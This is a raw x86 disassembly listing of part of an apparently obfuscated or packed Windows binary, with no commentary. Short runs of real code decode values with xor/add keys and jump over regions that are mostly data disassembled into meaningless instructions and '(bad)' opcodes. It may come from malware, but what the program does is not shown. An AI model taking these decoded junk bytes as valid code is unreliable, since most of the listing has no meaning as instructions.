  409216:	cmp    DWORD PTR [eax-0x39],eax
  409219:	lods   al,BYTE PTR ds:[esi]
  40921a:	or     cl,BYTE PTR [edx+0x708017c1]
  409220:	fwait
  409221:	push   ss
  409222:	add    BYTE PTR [ebx-0x7a],cl
  409225:	mov    edx,esi
  409227:	jne    0x409245
  409229:	outs   dx,BYTE PTR ds:[esi]
  40922a:	jo     0x4091ea
  40922c:	cmp    al,0x5
  40922e:	and    bh,BYTE PTR [ebx]
  409230:	adc    al,0x5a
  409232:	jns    0x4091d2
  409234:	cmp    ecx,DWORD PTR [esi]
  409236:	cmp    eax,0x7de30477
  40923b:	out    dx,al
  40923c:	int3   
  40923d:	jle    0x409225
  40923f:	pushf  
  409240:	sar    DWORD PTR [ebx],0x20
  409243:	add    al,ah
  409245:	jbe    0x409270
  409247:	fucomi st,st(7)
  409249:	jecxz  0x4092b9
  40924b:	neg    BYTE PTR [ecx-0x464b4d7c]
  409251:	fmul   st(4),st
  409253:	stos   DWORD PTR es:[edi],eax
  409254:	mov    bh,0x6c
  409256:	xor    eax,esi
  409258:	add    eax,ebx
  40925a:	mov    DWORD PTR [ebp-0x54],eax
  40925d:	lea    eax,[ebp-0x1c]
  409260:	mov    DWORD PTR [ebp-0x50],eax
  409263:	mov    eax,DWORD PTR [ebp-0x60]
  409266:	xor    eax,esi
  409268:	add    eax,ebx
  40926a:	mov    DWORD PTR [ebp-0x60],eax
  40926d:	lea    eax,[ebp-0x60]
  409270:	push   eax
  409271:	mov    eax,DWORD PTR [ebp+0xc]
  409274:	xor    eax,esi
  409276:	add    eax,ebx
  409278:	push   eax
  409279:	mov    eax,ds:0x414b1e
  40927e:	push   0x414a74
  409283:	push   DWORD PTR [eax]
  409285:	call   0x411333
  40928a:	jmp    0x4092c1
  40928f:	cmp    edi,0x13c
  409295:	jne    0x4092c1
  40929b:	mov    eax,DWORD PTR [ebp-0x10]
  40929e:	xor    eax,esi
  4092a0:	add    eax,ebx
  4092a2:	mov    DWORD PTR [ebp+0x8],eax
  4092a5:	mov    eax,ds:0x414afe
  4092aa:	mov    DWORD PTR [ebp+0x8],eax
  4092ad:	mov    eax,DWORD PTR [ebp-0x14]
  4092b0:	mov    DWORD PTR [ebp-0x4],eax
  4092b3:	mov    eax,DWORD PTR [ebp-0x4]
  4092b6:	push   0x4
  4092b8:	pop    ecx
  4092b9:	sub    ecx,eax
  4092bb:	add    ecx,DWORD PTR [ebp-0x18]
  4092be:	mov    DWORD PTR [ebp-0x8],ecx
  4092c1:	mov    eax,DWORD PTR [ebp+0xc]
  4092c4:	xor    eax,esi
  4092c6:	lea    edi,[edi+eax*1+0x327299]
  4092cd:	cmp    edi,0x50a
  4092d3:	jne    0x4089c6
  4092d9:	mov    eax,DWORD PTR [ebp+0xc]
  4092dc:	pop    edi
  4092dd:	xor    eax,esi
  4092df:	pop    esi
  4092e0:	add    eax,ebx
  4092e2:	pop    ebx
  4092e3:	leave  
  4092e4:	ret    0x8
  4092e7:	push   ebp
  4092e8:	mov    ebp,esp
  4092ea:	sub    esp,0x44
  4092ed:	push   edi
  4092ee:	adc    DWORD PTR ds:0x434537,ebx
  4092f4:	mov    eax,DWORD PTR [ebp+0xc]
  4092f7:	mov    DWORD PTR [ebp-0x10],eax
  4092fa:	and    DWORD PTR ds:0x43453b,0x5787
  409304:	jmp    0x40971b
  409309:	jns    0x4092bd
  40930b:	out    dx,al
  40930c:	std    
  40930d:	jge    0x40938c
  40930f:	or     eax,0x11d61472
  409314:	clc    
  409315:	pusha  
  409316:	je     0x4092f5
  409318:	sub    BYTE PTR [edx+0x707e7ee2],dl
  40931e:	jns    0x40939e
  409320:	jle    0x409347
  409322:	pop    ds
  409323:	aad    0x9f
  409325:	or     DWORD PTR [ecx+0x62],0xdc6dda41
  40932c:	pop    ebx
  40932d:	(bad)  
  40932e:	mov    edi,0x8bf02acb
  409333:	ret    
  409334:	in     al,0xd7
  409336:	mov    ebx,DWORD PTR ds:0x5d243f3f
  40933c:	mov    BYTE PTR [edx],al
  40933e:	jbe    0x4092f0
  409340:	mov    DWORD PTR [esi-0x71be927d],edx
  409346:	out    dx,al
  409347:	dec    eax
  409348:	add    BYTE PTR [esi+edi*8-0x40],dh
  40934c:	push   esp
  40934d:	ja     0x409335
  40934f:	cwde   
  409350:	xchg   ebp,eax
  409351:	div    BYTE PTR [esi-0x52]
  409354:	int    0x50
  409356:	or     ecx,DWORD PTR [eax+eax*4+0x7c]
  40935a:	inc    edx
  40935b:	or     DWORD PTR [eax-0x3c],esi
  40935e:	or     DWORD PTR [edi],0x23
  409361:	jno    0x4093b8
  409363:	push   edi
  409364:	ficomp WORD PTR [ecx-0x14ce1780]
  40936a:	stos   BYTE PTR es:[edi],al
  40936b:	or     BYTE PTR [eax+0x6cdfe09b],dh
  409371:	outs   dx,DWORD PTR ds:[esi]
  409372:	dec    ebp
  409373:	sbb    ch,BYTE PTR [ebx-0x1f]
  409376:	mov    edi,0xd5ac8302
  40937b:	mov    edi,0x9b18c60f
  409380:	lds    eax,FWORD PTR [eax]
  409382:	fwait
  409383:	inc    eax
  409384:	mov    eax,ds:0xd167edd6
  409389:	mov    al,al
  40938b:	in     al,0xd7
  40938d:	(bad)  
  40938e:	jp     0x40936e
  409390:	mov    es,WORD PTR [ecx-0x76]
  409393:	and    eax,DWORD PTR [edx]
  409395:	push   esi
  409396:	adc    al,0xf4
  409398:	lds    edi,FWORD PTR [esi]
  40939a:	ret    
  40939b:	scas   al,BYTE PTR es:[edi]
  40939c:	add    al,0xa6
  40939e:	lods   eax,DWORD PTR ds:[esi]
  40939f:	jl     0x409354
  4093a1:	aam    0x44
  4093a3:	cmp    edi,esi
  4093a5:	arpl   sp,ax
  4093a7:	and    DWORD PTR [ebx+0x7d47cb44],ebp
  4093ad:	test   BYTE PTR [ebx],bh
  4093af:	push   esi
  4093b0:	clc    
  4093b1:	pop    ebp
  4093b2:	lods   eax,DWORD PTR ds:[esi]
  4093b3:	in     eax,0xe8
  4093b5:	sub    al,0x60
  4093b7:	xchg   BYTE PTR [ebp+0x70e50d2f],bl
  4093bd:	adc    DWORD PTR [ecx],0xe58356b4
  4093c3:	cld    
  4093c4:	push   ebx
  4093c5:	gs adc edi,ebp
  4093c8:	xlat   BYTE PTR ds:[ebx]
  4093c9:	cwde   
  4093ca:	xor    bl,BYTE PTR [edx]
  4093cc:	hlt    
  4093cd:	lods   al,BYTE PTR ds:[esi]
  4093ce:	xchg   esp,eax
  4093cf:	push   0x2213a709
  4093d4:	jmp    0xf5ade060
  4093d9:	mov    edx,0x2182fd14
  4093de:	inc    esp
  4093df:	loope  0x409365
  4093e1:	pop    edx
  4093e2:	inc    eax
  4093e3:	jmp    0xe68:0x8ac61468
  4093ea:	adc    esp,DWORD PTR [edi+0x43]
  4093ed:	aad    0x75
  4093ef:	xchg   esp,eax
  4093f0:	bnd je 0x409410
  4093f3:	std    
  4093f4:	or     ecx,DWORD PTR [ecx+0x54638286]
  4093fa:	push   0x6
  4093fc:	adc    bh,BYTE PTR [ebx-0x78]
  4093ff:	loop   0x4093bd
  409401:	sub    edi,DWORD PTR [esi-0x3f]
  409404:	ins    BYTE PTR es:[edi],dx
  409405:	inc    esp
  409406:	push   esi
  409407:	jae    0x409428
  409409:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40940a:	scas   eax,DWORD PTR es:[edi]
  40940b:	cmc    
  40940c:	xor    bh,BYTE PTR [edi]
  40940e:	and    ebx,DWORD PTR [eax]
  409410:	mul    edi
  409412:	mov    DWORD PTR [esp+edx*4+0xd],0xee8560c9
  40941a:	jae    0x40948f
  40941c:	pop    ecx
  40941d:	(bad)  
  40941e:	enter  0x8a5c,0x8d
  409422:	mov    esi,0xaebf9470
  409427:	outs   dx,BYTE PTR ds:[esi]
  409428:	sbb    eax,0x56e4fc3e
  40942d:	inc    esi
  40942e:	je     0x4093d5
  409430:	(bad)  
  409431:	out    0x5,al
  409433:	icebp  
  409434:	cwde   
  409435:	out    0x12,al
  409437:	pop    ecx
  409438:	cs dec ebp
  40943a:	or     DWORD PTR [ebx-0x7],edx
  40943d:	xlat   BYTE PTR ds:[ebx]
  40943e:	mov    dh,0xb4
  409440:	mov    ds:0x4d621e9e,al
  409445:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409446:	jecxz  0x4093f1
  409448:	sub    eax,0x1134cd2a
  40944d:	das    
  40944e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40944f:	std    
  409450:	iret   
  409451:	mov    edx,0x9fe265ed
  409456:	data16 (bad) 
  409458:	mov    ds:0x51342f52,eax
  40945d:	scas   eax,DWORD PTR es:[edi]
  40945e:	cwde   
  40945f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409460:	mov    BYTE PTR [edi-0x63],dl
  409463:	pop    edi
  409464:	cmc    
  409465:	(bad)  
  409466:	sub    eax,DWORD PTR [esi]
  409468:	pushf  
  409469:	cwde   
  40946a:	aam    0x83
  40946c:	aam    0x49
  40946e:	pop    DWORD PTR [ebp-0xcc1ded3]
  409474:	jmp    0xa4bc97d0
  409479:	mov    BYTE PTR ds:0x29299598,ch
  40947f:	xchg   esp,eax
  409480:	jnp    0x409460
  409482:	(bad)  
  409483:	scas   al,BYTE PTR es:[edi]
  409484:	cmp    BYTE PTR [eax+ecx*2-0x3c],0x68
  409489:	sub    ecx,esp
  40948b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40948c:	lods   eax,DWORD PTR ds:[esi]
  40948d:	xchg   ecx,eax
  40948e:	shl    esi,0x8b
  409491:	mov    bl,0xba
  409493:	add    esi,DWORD PTR [ecx+edx*1+0x6]
  409497:	and    bh,BYTE PTR [ebx-0x6cd57ce8]
  40949d:	aam    0x37
  40949f:	xchg   ebx,eax
  4094a0:	sahf   
  4094a1:	dec    esp
  4094a2:	cmp    bh,bh
  4094a4:	loopne 0x4094db
  4094a6:	loop   0x4094f6
  4094a8:	jns    0x4094e4
  4094aa:	push   ss
  4094ab:	lea    edx,[ecx-0x4e514160]
  4094b1:	mov    WORD PTR [ebx+esi*2],es
  4094b4:	int    0x36
  4094b6:	aaa    
  4094b7:	loope  0x409453
  4094b9:	jae    0x4094bd
  4094bb:	mov    al,0xff
  4094bd:	mov    edx,0x112dc16b
  4094c2:	dec    esp
  4094c3:	jecxz  0x40948d
  4094c5:	mov    dl,0x8a
  4094c7:	add    eax,0x3c6956b5
  4094cc:	outs   dx,BYTE PTR ds:[esi]
  4094cd:	frstor [esi+0x45]
  4094d0:	loopne 0x40951b
  4094d2:	fsubr  QWORD PTR [edx]
  4094d4:	ja     0x409513
  4094d6:	jnp    0x4094db
  4094d8:	or     ebx,ebp
  4094da:	push   ecx
  4094db:	fwait
  4094dc:	mov    bl,0x64
  4094de:	xchg   esi,eax
  4094df:	jmp    0x4094a6
  4094e1:	or     BYTE PTR [ecx-0x39],al
  4094e4:	scas   eax,DWORD PTR es:[edi]
  4094e5:	and    DWORD PTR [ecx+0x2bcb3653],esi
  4094eb:	test   al,0xbe
  4094ed:	pop    ds
  4094ee:	mov    ds:0x9822675e,al
  4094f3:	or     BYTE PTR [esi],0x2d
  4094f6:	addr16 add al,0x65
  4094f9:	retf   
  4094fa:	test   eax,0xef264a11
  4094ff:	es xor bh,BYTE PTR cs:[eax-0x563cbc74]
  409507:	mov    bl,0x1e
  409509:	jne    0x4094bd
  40950b:	cmp    al,0x89
  40950d:	sbb    ch,BYTE PTR [ebx+0x741eb511]
  409513:	mov    BYTE PTR [ebp-0x46],ah
  409516:	lea    eax,[ecx]
  409518:	add    eax,0xabc074bf
  40951d:	mov    dh,BYTE PTR [eax-0x3c]
  409520:	enter  0xa633,0xb1
  409524:	aad    0x8
  409526:	je     0x409589
  409528:	pusha  
  409529:	jae    0x4094b1
  40952b:	sbb    eax,ecx
  40952d:	aam    0xee
  40952f:	push   edx
  409530:	inc    esp
  409531:	dec    edx
  409532:	cmp    eax,0x9a7b42c
  409537:	mov    eax,ds:0x72ecac84
  40953c:	xchg   esi,eax
  40953d:	rcr    DWORD PTR [ecx],0xb
  409540:	popf   
  409541:	sahf   
  409542:	dec    edi
  409543:	push   es
  409544:	cmp    BYTE PTR ds:0x244de346,dh
  40954a:	hlt    
  40954b:	daa    
  40954c:	add    DWORD PTR [ebx+0x47398430],esp
  409552:	and    eax,0x8929cd67
  409557:	dec    esp
  409558:	dec    ebp
  409559:	sub    dh,bh
  40955b:	or     al,0xc9
  40955d:	jmp    0x4095b4
  40955f:	mov    al,0xc9
  409561:	xlat   BYTE PTR ds:[ebx]
  409562:	inc    eax
  409563:	shl    BYTE PTR [ecx-0x4c],0xe0
  409567:	add    al,0xab
  409569:	add    DWORD PTR [ebx],esp
  40956b:	mov    ecx,0x90f402a4
  409570:	mov    dh,0x21
  409572:	jmp    0xb14a:0xabe7abbb
  409579:	xor    BYTE PTR [edx-0x198bae41],cl
  40957f:	push   eax
  409580:	bound  esi,QWORD PTR [edx+eiz*1-0x54]
  409584:	popf   
  409585:	dec    edx
  409586:	mov    ah,0xc9
  409588:	and    edi,DWORD PTR [edi-0x4f]
  40958b:	xor    cl,bl
  40958d:	jg     0x4095d3
  40958f:	ror    edi,cl
  409591:	jmp    0xd0b975b0
  409596:	mov    ebx,0xb7e62ffc
  40959b:	sub    dl,BYTE PTR [ebx-0x517fca86]
  4095a1:	jge    0x4095c7
  4095a3:	xor    BYTE PTR [edi],0x15
  4095a6:	xor    DWORD PTR ds:0x27f181cc,ebp
  4095ac:	rcr    DWORD PTR gs:[ecx+edx*2+0x6a43dbd5],0xc6
  4095b5:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095b7:	inc    ebx
  4095b8:	in     al,dx
  4095b9:	cmp    ch,al
  4095bb:	dec    eax
  4095bc:	xchg   ecx,eax
  4095bd:	loop   0x409602
  4095bf:	iret   
  4095c0:	jae    0x409576
  4095c2:	into   
  4095c3:	mov    ds:0x4f286f63,eax
  4095c8:	ror    BYTE PTR [esi],1
  4095ca:	enter  0x1704,0xfa
  4095ce:	aas    
  4095cf:	icebp  
  4095d0:	mov    eax,0x90aaec96
  4095d5:	inc    edx
  4095d6:	mov    dh,0x17
  4095d8:	or     bh,dl
  4095da:	jo     0x40961c
  4095dc:	xor    BYTE PTR [eax],0x5a
  4095df:	jns    0x409568
  4095e1:	cwde   
  4095e2:	fs loop 0x409580
  4095e5:	fidivr WORD PTR [eax+0x45fe55a6]
  4095eb:	cmp    BYTE PTR [ecx],bh
  4095ed:	dec    edi
  4095ee:	aam    0x8
  4095f0:	push   edx
  4095f1:	out    dx,al
  4095f2:	xchg   edi,eax
  4095f3:	xchg   esi,eax
  4095f4:	mov    cs,WORD PTR [esi+0x509dae48]
  4095fa:	arpl   WORD PTR [edi-0x1981a8cd],bp
  409600:	jecxz  0x40966c
  409602:	rol    DWORD PTR [esp+eiz*2],1
  409605:	cld    
  409606:	(bad)  
  409607:	jno    0x40964b
  409609:	and    BYTE PTR [ecx],ch
  40960b:	mov    bh,0x28
  40960d:	rcl    BYTE PTR [eax+0x3f03a8ca],0x23
  409614:	jae    0x409664
  409616:	jp     0x409641
  409618:	jg     0x4095c8
  40961a:	ds jge 0x40960f
  40961d:	and    eax,0x6e8e95ad
  409622:	mov    cl,0x50
  409624:	jne    0x4095a9
  409626:	adc    dh,cl
  409628:	sti    
  409629:	setl   BYTE PTR [eax+0x33]
  40962d:	sub    DWORD PTR [esp+eax*2+0x4c],0xfffffff7
  409632:	cmc    
  409633:	lahf   
  409634:	test   BYTE PTR [ebx],bh
  409636:	leave  
  409637:	jns    0x40960a
  409639:	mov    eax,0xef7ff0c9
  40963e:	jmp    ecx
  409640:	sub    dl,BYTE PTR [ebp*1+0x6470bc24]
  409647:	les    edi,FWORD PTR [edx-0x5ea0c6d1]
  40964d:	iret   
  40964e:	mov    dl,0x7
  409650:	jl     0x4095d7
  409652:	mov    bh,0x24
  409654:	test   edi,0xa650b349
  40965a:	shl    BYTE PTR [ebp+0x3c],0x92
  40965e:	or     dl,BYTE PTR [ebx-0x25bf8741]
  409664:	inc    edx
  409665:	pop    edx
  409666:	xchg   esp,eax
  409667:	std    
  409668:	jge    0x4096cc
  40966a:	add    al,BYTE PTR [esi]
  40966c:	jno    0x4096cc
  40966e:	pop    eax
  40966f:	jb     0x4096d4
  409671:	mov    ebp,0x30129a68
  409676:	adc    eax,0xf9acd2d
  40967b:	aad    0x43
  40967d:	ret    0xcbf8
  409680:	xor    DWORD PTR [ebx+0x41],edx
  409683:	xlat   BYTE PTR ds:[ebx]
  409684:	(bad)  
  409685:	pop    edx
  409686:	pop    bx
  409688:	out    dx,al
  409689:	inc    ebp
  40968a:	in     al,0x53
  40968c:	inc    ebx
  40968d:	jb     0x40963e
  40968f:	into   
  409690:	pop    ss
  409691:	pop    ds
  409692:	inc    ecx
  409693:	sub    DWORD PTR [ecx-0x105546c0],0xe5434a6
  40969d:	xchg   ebx,eax
  40969e:	mov    al,ds:0x65e31e11
  4096a3:	xchg   BYTE PTR [edi+0x5d588c0],al
  4096a9:	xor    ah,ch
  4096ab:	pop    edi
  4096ac:	pop    esp
  4096ad:	sub    eax,0x4e627a2
  4096b2:	and    BYTE PTR [eax+0x4],bl
  4096b5:	pop    ds
  4096b6:	mov    eax,0xd3c56940
  4096bb:	out    dx,eax
  4096bc:	fadd   DWORD PTR [ecx-0x53]
  4096bf:	adc    al,0x15
  4096c1:	pop    esp
  4096c2:	pop    ss
  4096c3:	jg     0x409723
  4096c5:	adc    eax,0x934880a2
  4096ca:	jae    0x4096d7
  4096cc:	mov    dh,0xf9
  4096ce:	lods   al,BYTE PTR ds:[esi]
  4096cf:	mov    WORD PTR [esi-0x4a],fs
  4096d2:	in     eax,0x54
  4096d4:	idiv   dh
  4096d6:	fnsave cs:[eax-0xc]
  4096da:	jp     0x4096d5
  4096dc:	out    0xdc,eax
  4096de:	or     cl,BYTE PTR [ebx+0x52e77f1]
  4096e4:	in     al,dx
  4096e5:	aaa    
  4096e6:	inc    esi
  4096e7:	xor    eax,0x64daca34
  4096ec:	xor    ah,BYTE PTR [ecx]
  4096ee:	rcr    DWORD PTR [edx-0x29b0806b],0x65
  4096f5:	aaa    
  4096f6:	inc    eax
  4096f7:	outs   dx,BYTE PTR ds:[esi]
  4096f8:	int    0xa1
  4096fa:	or     BYTE PTR [edx],al
  4096fc:	ret    
  4096fd:	aad    0xc5
  4096ff:	mov    WORD PTR [esp+ecx*4+0x69d489df],?
  409706:	fmul   QWORD PTR [ebx]
  409708:	stos   BYTE PTR es:[edi],al
  409709:	dec    esi
  40970a:	aam    0xb6
  40970c:	pop    edi
  40970d:	add    DWORD PTR [eax+0x3b],ebx
  409710:	leave  
  409711:	sbb    eax,DWORD PTR [esi]
  409713:	fld    QWORD PTR [edx+0x7]
  409716:	pushf  
  409717:	pop    es
  409718:	fild   QWORD PTR [eax+0x7d]
  40971b:	mov    eax,DWORD PTR [ebp+0x8]
  40971e:	mov    edi,DWORD PTR ds:0x43460f
  409724:	or     DWORD PTR ds:0x434613,edi
  40972a:	mov    DWORD PTR [ebp+0x8],0xf89c8536
  409731:	xor    edi,0x551
  409737:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40973e:	movzx  ecx,WORD PTR ds:0x4344f3
  409745:	add    ecx,DWORD PTR ds:0x434537
  40974b:	mov    DWORD PTR ds:0x4344f3,ecx
  409751:	mov    edx,DWORD PTR [ebp+0x8]
  409754:	jmp    0x409b6b
  409759:	jmp    0x409767
  40975b:	or     al,0xd8
  40975d:	std    
  40975e:	fdiv   st,st(3)
  409760:	sbb    eax,0x3c00db39
  409765:	push   esp
  409766:	sub    ch,BYTE PTR ds:0x7eee9486
  40976c:	jle    0x4097de
  40976e:	jns    0x4097ee
  409770:	jle    0x4097c1
  409772:	xchg   edx,eax
  409773:	pop    esp
  409774:	or     al,0x68
  409776:	add    ah,ah
  409778:	xor    ebp,DWORD PTR [eax-0x13]
  40977b:	sub    DWORD PTR [ecx-0x6f],0xb8805ec7
  409782:	pop    esp
  409783:	imul   ebx,ecx,0x36499755
  409789:	std    
  40978a:	add    bh,BYTE PTR [ecx-0x3a574f96]
  409790:	cmp    al,ah
  409792:	adc    ebx,DWORD PTR [esi+0x2f]
  409795:	jge    0x4097b4
  409797:	sti    
  409798:	push   edx
  409799:	into   
  40979a:	daa    
  40979b:	stc    
  40979c:	sbb    al,0x75
  40979e:	js     0x40976b
  4097a0:	ret    
  4097a1:	stos   BYTE PTR es:[edi],al
  4097a2:	and    dl,bl
  4097a4:	cli    
  4097a5:	and    DWORD PTR ds:0x3d4c822e,ebx
  4097ab:	adc    BYTE PTR [edi-0x55],ah
  4097ae:	out    dx,eax
  4097af:	data16 add BYTE PTR [edx+eax*1],dl
  4097b3:	add    eax,0x7fce0136
  4097b8:	pop    esp
  4097b9:	(bad)  
  4097ba:	xlat   BYTE PTR ds:[ebx]
  4097bb:	adc    BYTE PTR [edi],0x1c
  4097be:	sub    ah,cl
  4097c0:	mov    ds:0xa7d6344d,al
  4097c5:	div    DWORD PTR [esp+ebp*2+0x69b869e5]
  4097cc:	mov    dl,BYTE PTR [edx+0x1b175979]
  4097d2:	jnp    0x409804
  4097d4:	outs   dx,BYTE PTR ds:[esi]
  4097d5:	scas   al,BYTE PTR es:[edi]
  4097d6:	xor    esi,edx
  4097d8:	sub    ch,bl
  4097da:	out    0x75,al
  4097dc:	jo     0x40978b
  4097de:	adc    ah,ah
  4097e0:	stos   BYTE PTR es:[edi],al
  4097e1:	pushf  
  4097e2:	mov    esp,0xcce92a13
  4097e7:	xchg   ecx,eax
  4097e8:	xchg   esi,eax
  4097e9:	or     BYTE PTR [ebp+0x114acbb0],bh
  4097ef:	xor    eax,0xf188281a
  4097f4:	cs nop
  4097f6:	xor    al,0x93
  4097f8:	add    ah,BYTE PTR [ecx+0x26b91c95]
  4097fe:	icebp  
  4097ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409800:	outs   dx,BYTE PTR ds:[esi]
  409801:	add    dl,BYTE PTR [eax-0x7]
  409804:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409805:	aam    0x2d
  409807:	sub    cl,BYTE PTR [eax+eax*2-0x7d8b1226]
  40980e:	scas   eax,DWORD PTR es:[edi]
  40980f:	ror    esi,0x6c
  409812:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409813:	sahf   
  409814:	jecxz  0x409857
  409816:	xlat   BYTE PTR ds:[ebx]
  409817:	add    eax,0xffad79b2
  40981c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40981d:	cmp    eax,0xdca2d2e2
  409822:	add    al,0xf0
  409824:	fldcw  WORD PTR [eax+eiz*1]
  409827:	xor    DWORD PTR ds:0x5eaed087,ebp
  40982d:	into   
  40982e:	cmp    ebx,DWORD PTR [edi]
  409830:	mov    ch,0x9a
  409832:	xchg   ebp,eax
  409833:	xor    eax,0xfcf5d9a
  409838:	push   esp
  409839:	data16 aaa 
  40983b:	jae    0x409884
  40983d:	adc    BYTE PTR [edx],bl
  40983f:	dec    BYTE PTR [ebx-0x34]
  409842:	outs   dx,BYTE PTR ds:[esi]
  409843:	lods   eax,DWORD PTR ds:[esi]
  409844:	xchg   ebx,eax
  409845:	adc    BYTE PTR [edi],ah
  409847:	cmp    al,0x26
  409849:	js     0x40989f
  40984b:	test   eax,0x2f1c2de5
  409850:	mov    ah,0x25
  409852:	push   ebx
  409853:	add    al,0xb7
  409855:	cs inc edi
  409857:	leave  
  409858:	xchg   esi,eax
  409859:	daa    
  40985a:	adc    BYTE PTR [eax],ah
  40985c:	dec    ecx
  40985d:	ret    
  40985e:	jnp    0x4097f9
  409860:	scas   al,BYTE PTR es:[edi]
  409861:	and    BYTE PTR [edi-0xf],bh
  409864:	xor    DWORD PTR [ebp+0x6191e699],edi
  40986a:	jne    0x40980c
  40986c:	ss pop ebp
  40986e:	adc    al,BYTE PTR ds:0x1ece3dc4
  409874:	loop   0x40982c
  409876:	sbb    al,ah
  409878:	inc    eax
  409879:	fsubr  DWORD PTR [ecx+0x76]
  40987c:	outs   dx,BYTE PTR ds:[esi]
  40987d:	out    0xb5,al
  40987f:	push   ebp
  409880:	into   
  409881:	(bad)  
  409882:	mov    bl,0x6e
  409884:	loop   0x4098a0
  409886:	jb     0x4098cf
  409888:	add    bl,BYTE PTR [edi-0x54]
  40988b:	les    ebp,FWORD PTR [ecx+ebp*8+0x6f]
  40988f:	xchg   esi,eax
  409890:	icebp  
  409891:	pusha  
  409892:	pop    ss
  409893:	retf   
  409894:	jle    0x4098ff
  409896:	add    esi,esi
  409898:	push   ecx
  409899:	sub    DWORD PTR [eax],ecx
  40989b:	rcr    BYTE PTR [ecx],1
  40989d:	mov    ds:0x80a2d409,eax
  4098a2:	xchg   esp,eax
  4098a3:	(bad)  
  4098a4:	mov    ss,WORD PTR [edi]
  4098a6:	add    BYTE PTR [edx-0x6c71d0cb],bl
  4098ac:	mov    WORD PTR [edx+0xf7f114b],ds
  4098b2:	imul   esi,DWORD PTR [edx+0x62],0x368e7d61
  4098b9:	mov    esi,eax
  4098bb:	add    ebx,eax
  4098bd:	out    0x31,eax
  4098bf:	iret   
  4098c0:	(bad)  
  4098c1:	repnz xor al,cl
  4098c4:	dec    ebx
  4098c5:	fwait
  4098c6:	es and al,0xfc
  4098c9:	outs   dx,BYTE PTR ds:[esi]
  4098ca:	addr16 cli 
  4098cc:	mov    bh,0xc2
  4098ce:	cdq    
  4098cf:	and    esp,DWORD PTR [ebx-0x5b9da5af]
  4098d5:	test   DWORD PTR [ecx+0x3c29e824],ebp
  4098db:	test   DWORD PTR [edi-0x36],edx
  4098de:	jmp    0x237a:0xc8b24659
  4098e5:	pop    ebx
  4098e6:	xor    al,0xd
  4098e8:	xor    BYTE PTR [edx+0xcc0d43e],al
  4098ee:	cmp    al,0xb2
  4098f0:	fisttp DWORD PTR ds:0x6b3dc25c
  4098f6:	pop    esi
  4098f7:	ret    
  4098f8:	je     0x409907
  4098fa:	inc    ecx
  4098fb:	inc    ebp
  4098fc:	push   ebx
  4098fd:	ror    DWORD PTR [ebp-0x4fab80b2],cl
  409903:	jo     0x4098ed
  409905:	clc    
  409906:	cwde   
  409907:	mov    cl,bh
  409909:	loopne 0x4098e0
  40990b:	sub    dh,BYTE PTR [edx]
  40990d:	adc    DWORD PTR [ebp-0xf38d174],0xa85dc105
  409917:	fimul  WORD PTR [ebp+ebp*4-0x6f]
  40991b:	out    dx,al
  40991c:	or     DWORD PTR [edx],ecx
  40991e:	push   0x403fd5c8
  409923:	jo     0x4098c8
  409925:	mov    edx,0x40e2f127
  40992a:	jbe    0x4098b1
  40992c:	cdq    
  40992d:	(bad)  
  40992e:	jp     0x4098ff
  409930:	mov    ds,WORD PTR [ebx+0x582051b2]
  409936:	hlt    
  409937:	push   ebx
  409938:	cmp    al,0x22
  40993a:	adc    edi,DWORD PTR ds:0xd02e89cc
  409940:	mov    ah,dh
  409942:	aas    
  409943:	mov    eax,ds:0x563d6afd
  409948:	out    0x3c,al
  40994a:	fwait
  40994b:	jmp    FWORD PTR [ecx+0x3bd66e9c]
  409951:	adc    al,0x3
  409954:	mov    ebx,0x69dbfab9
  409959:	(bad)  
  40995b:	xchg   BYTE PTR [edi],bl
  40995d:	in     eax,0x27
  40995f:	outs   dx,DWORD PTR ds:[esi]
  409960:	pop    es
  409961:	ja     0x4099e0
  409963:	rcl    DWORD PTR [ebp-0x76],cl
  409966:	sbb    BYTE PTR [esi],0x7a
  409969:	in     al,dx
  40996a:	imul   esp,DWORD PTR [ebx+ebx*2+0x3e163f74],0x109bb487
  409975:	xchg   ecx,eax
  409976:	push   ebp
  409977:	adc    esi,DWORD PTR [ecx+edx*8+0x17]
  40997b:	and    BYTE PTR [esi+eax*8+0x203c2de1],bl
  409982:	cmc    
  409983:	out    0x79,al
  409985:	leave  
  409986:	or     DWORD PTR [edi+0x3cae18e4],eax
  40998c:	inc    esi
  40998d:	xchg   ecx,eax
  40998e:	push   es
  40998f:	call   0xdf0334d
  409994:	xor    eax,DWORD PTR [ecx+0x70]
  409997:	inc    ebx
  409998:	push   edi
  409999:	ins    DWORD PTR es:[edi],dx
  40999a:	es in  al,dx
  40999c:	jbe    0x4099b5
  40999e:	lahf   
  40999f:	mov    al,0x5b
  4099a1:	cmp    ecx,DWORD PTR [edi+0x585ba629]
  4099a7:	cmc    
  4099a8:	and    al,0x38
  4099aa:	(bad)  
  4099ab:	sbb    ch,BYTE PTR [eax+0xb]
  4099ae:	adc    ch,BYTE PTR [eax+0x51c0a24]
  4099b4:	(bad)  
  4099b5:	aas    
  4099b6:	aad    0x65
  4099b8:	(bad)  
  4099b9:	adc    DWORD PTR [edx],ecx
  4099bb:	jne    0x409a31
  4099bd:	jns    0x409943
  4099bf:	not    DWORD PTR [esi-0x76]
  4099c2:	(bad)  
  4099c3:	push   cs
  4099c4:	mov    es,WORD PTR [edi-0x3e]
  4099c7:	xlat   BYTE PTR ds:[ebx]
  4099c8:	les    esp,FWORD PTR [edi]
  4099ca:	sub    eax,0x7b68700e
  4099cf:	jge    0x40999f
  4099d1:	rcl    DWORD PTR [edx],1
  4099d3:	inc    ebx
  4099d4:	pop    es
  4099d5:	mov    dh,0xda
  4099d7:	(bad)
  4099db:	sub    DWORD PTR [ebx],ebx
  4099dd:	(bad)  
  4099df:	fadd   DWORD PTR [ebx-0x12]
  4099e2:	int    0x45
  4099e4:	sbb    bh,BYTE PTR [eax-0x54500389]
  4099ea:	int    0xb5
  4099ec:	ins    BYTE PTR es:[edi],dx
  4099ed:	jae    0x409986
  4099ef:	popa   
